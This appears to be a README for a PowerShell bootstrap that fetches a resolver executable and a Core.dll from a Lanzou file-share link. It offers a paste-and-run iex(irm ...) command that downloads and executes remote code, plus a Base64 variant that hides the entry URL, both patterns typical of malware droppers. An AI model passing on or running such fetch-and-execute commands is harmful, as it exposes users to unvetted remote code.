# bootstrap

PowerShell bootstrap for downloading a file from a Lanzou share link.

## Files

- `Colud.ps1` - public PowerShell bootstrap script.
- `Download.exe` - self-contained C++ resolver using WinHTTP.

## Plain usage

```powershell
iex(irm "https://vtlowkey.github.io/bootstrap/Colud.ps1")
```

## Base64-encoded entry URL

The entry URL can be encoded with Base64 so it is not shown as plaintext in the command:

```powershell
$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly92dGxvd2tleS5naXRodWIuaW8vYm9vdHN0cmFwL0NvbHVkLnBzMQ=="));iex(irm $u)
```

Base64 is encoding, not encryption. Anyone can decode it.

## What it does

1. Downloads `Download.exe` to `%TEMP%`.
2. Verifies the resolver SHA256.
3. Resolves the configured Lanzou share link.
4. Downloads the target file.
5. Deletes the temporary resolver.

The current configuration downloads `Core.dll` from the sample Lanzou share URL to the current directory.

Only execute scripts and binaries from sources you trust.
